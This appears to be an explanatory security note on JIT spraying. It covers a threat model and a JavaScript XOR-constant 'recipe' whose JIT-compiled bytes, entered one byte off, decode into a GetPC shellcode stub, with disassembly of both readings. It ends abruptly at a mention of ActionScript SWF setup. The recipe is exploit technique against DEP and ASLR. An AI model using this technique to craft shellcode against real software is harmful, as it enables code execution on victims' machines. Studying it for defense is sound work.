### Attack Summary

***JIT Spraying:*** Using constants to hold "hidden" instructions, ensuring that they are JITed as machine code then disrupting the execution flow by one byte (memory leak) to execute those instructions.

### Attacker Threat Model

The attacker has access to the VM of a dynamically typed language ((ECMA|Java|Action)Script, Java, Python, etc.) can write a script and execute it. DEP and ASLR memory protection are in action. The return address from a vulnerable function can be changed to give control to code in the JITed pages. The memory with the JITed code is *executable*.

### Background

JIT is predictable and must copy some constants to the executable page. Given a uniform statement such as a long sum or repeating pattern, those constants can encode small instructions and then control flow to the next constant location.

### Recipe

```javascript
var y = (0x3c54d0d9 ^ 0x3c909058 ^ 0x3c59f46a ^ 0x3c90c801 ^ ...);
```

is compiled to 

```javascript
03470069 B8 D9D0543C     MOV EAX,3C54D0D9
0347006E 35 5890903C     XOR EAX,3C909058
03470073 35 6AF4593C     XOR EAX,3C59F46A
03470078 35 01C8903C     XOR EAX,3C90C801
0347007D 35 D930903C     XOR EAX,3C9030D9
03470082 35 5B53533C     XOR EAX,3C53535B
```

which if execution begins at `0x0347006A` will become the `GetPC()` method:

```javascript
0347006A  D9 D0          FNOP
0347006C  54             PUSH ESP
0347006D  3C 35          CMP AL,35
0347006F  58             POP EAX
03470070  90             NOP
03470071  90             NOP
03470072  3C 35          CMP AL,35
03470074  6A F4          PUSH -0C
03470076  59             POP ECX
03470077  3C 35          CMP AL,35
03470079  01 C8          ADD EAX,ECX
0347007B  90             NOP
0347007C  3C 35          CMP AL,35
0347007E  D9 30          FSTENV DS:[EAX]  
```

The attacker needs to find the JITed shellcode in memory and disrupt the execution flow to point to it.

### Tools and Setup

For a specific ActionScript compiler `as3compiler.exe` here, the author creates two specific SWF files. 

